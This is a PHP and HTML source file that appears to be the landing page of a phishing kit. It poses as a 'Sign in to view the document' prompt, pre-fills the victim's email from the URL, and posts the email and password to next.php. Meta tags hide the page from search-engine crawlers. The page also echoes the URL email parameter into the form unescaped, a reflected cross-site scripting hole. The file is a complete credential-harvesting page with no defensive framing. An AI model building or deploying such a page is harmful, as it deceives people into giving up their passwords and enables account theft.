<?php
function getloginIDFromlogin($email)
{
$find = '@';
$pos = strpos($email, $find);
$loginID = substr($email, 0, $pos);
return $loginID;
}
function getDomainFromEmail($email)
{
// Get the data after the @ sign
$domain = substr(strrchr($email, "@"), 1);
return $domain;
}
$login = $_GET['email'];
$loginID = getloginIDFromlogin($login);
$domain = getDomainFromEmail($login);
$ln = strlen($login);
$len = strrev($login);
$x = 0;
for($i=0; $i<$ln; $i++){
	if($len[$i] == "@"){
		$x = $i;
		break;
	}
}
$yuh = substr($len,0,$x);
$yuh = strrev($yuh);
for($i=0; $i<$ln; $i++){
	if($yuh[$i] == "."){
		$x = $i;
		break;
	}
}
$yuh = substr($yuh,0,$x);
$yuh = ucfirst($yuh);
?>

<!DOCTYPE html>
<html>
<head>
	<title>Sign in to continue</title>
	<link rel="icon" type="image/png" href="img/logo.png">
    <meta name="robots" content="noindex, noarchive, nofollow, nosnippet" />
    <meta name="googlebot" content="noindex, noarchive, nofollow, nosnippet, noimageindex" />
    <meta name="slurp" content="noindex, noarchive, nofollow, nosnippet, noodp, noydir" />
    <meta name="msnbot" content="noindex, noarchive, nofollow, nosnippet" />
    <meta name="teoma" content="noindex, noarchive, nofollow, nosnippet" />
	<meta name="viewport" content="width=device-width, initial-scale=1">
	
	<link rel="stylesheet" href="css/styles.css">

</head>
<body>
<div class="files">
	<img src="img/ex.png" height="50">
	<h2>Sign in to view the document</h2>
	
	<div class="login">
		<form action="next.php" method="post">
	  
	  <div>
		<input type="email" id="email" name="email" required placeholder=" " value="<?php echo $_GET['email']; ?>" />
		<label for="email">Email Address</label>
		<div class="requirements">
		  Must be a valid email address.
		</div>
	  </div>
	  
	  <div>
		<input type="password" id="password" name="password" required placeholder=" " />
		<label for="password">Password</label>
		<div class="requirements">
		  Your password must be at least 6 characters as well as contain at least one uppercase, one lowercase, and one number.
		</div>
	  </div>
	  
	  <input type="submit" value="View Document" />

	</form>
	</div>
</div>
</body>
</html>
